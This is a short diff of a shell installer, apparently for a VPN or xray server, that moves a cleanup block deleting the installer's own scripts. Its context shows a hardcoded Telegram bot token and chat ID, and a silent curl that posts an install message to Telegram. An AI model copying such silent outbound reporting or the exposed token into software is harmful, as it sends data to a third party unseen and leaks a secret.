@@ -253,14 +253,6 @@ echo "==============-[ Lunoxx Impostor ]-================"
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
-rm /root/setup.sh >/dev/null 2>&1
-rm /root/ins-xray.sh >/dev/null 2>&1
-rm /root/insshws.sh >/dev/null 2>&1
-secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
-echo -e "
-"
-read -n 1 -s -r -p "Press any key to menu"
-menu
     CHATID="335842883"
     KEY="6407054122:AAEdBIEzbDznBoSvKEM1JkBIKwlBdFIi59k"
     TIME="10"
@@ -279,3 +271,11 @@ menu
 "
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
+rm /root/setup.sh >/dev/null 2>&1
+rm /root/ins-xray.sh >/dev/null 2>&1
+rm /root/insshws.sh >/dev/null 2>&1
+secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
+echo -e "
+"
+read -n 1 -s -r -p "Press any key to menu"
+menu
